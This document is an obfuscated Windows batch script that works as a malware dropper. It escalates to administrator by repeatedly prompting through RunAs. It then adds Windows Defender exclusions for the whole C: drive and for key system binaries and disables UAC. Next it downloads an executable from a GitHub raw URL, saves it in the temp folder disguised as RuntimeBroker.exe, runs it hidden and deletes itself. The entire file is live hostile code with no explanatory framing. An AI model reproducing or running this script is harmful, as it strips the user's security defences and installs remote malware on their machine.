@echo off & setlocal enableDelayedExpansion
set "GjG=NET" & set "neL=>nul" & set "bhwAd=SESSION" & set "yVtrS=2>&1"
%GjG% %bhwAd% %neL% %yVtrS%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "Giv=qux" & set "Ddzd=baz" & set "hlc=foo" & set "fxxSl=bar" & rem QBN CrGoFP RkkV
set "ZMYY=powershell -ExecutionPolicy Bypass -Command"
set "ZbgY=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "oncg='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "ZcVTT='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!ZMYY! "!ZbgY! !oncg! !ZcVTT!" %neL% %yVtrS%
set "IFkr=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "qeqi=-Name 'EnableLUA' -Value 0"
!ZMYY! "!IFkr! !qeqi!" %neL% %yVtrS%
set "qxjx=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!ZMYY! "!qxjx!" %neL% %yVtrS%
if !errorlevel! neq 0 (goto %a%)
set "qMy=timeout /t" & !qMy! 2 %neL% %yVtrS%
set "XAPZ=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "sCs=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "nbkQ=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!ZMYY! "!XAPZ! !sCs! !nbkQ!" %neL% %yVtrS%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!qMy! 1 %neL% %yVtrS% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %neL% %yVtrS%
del /f /q "%~f0" %neL% %yVtrS%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %neL% %yVtrS%
if !errorlevel! neq 0 (!qMy! 3 %neL% %yVtrS% & goto %b%)
exit /b
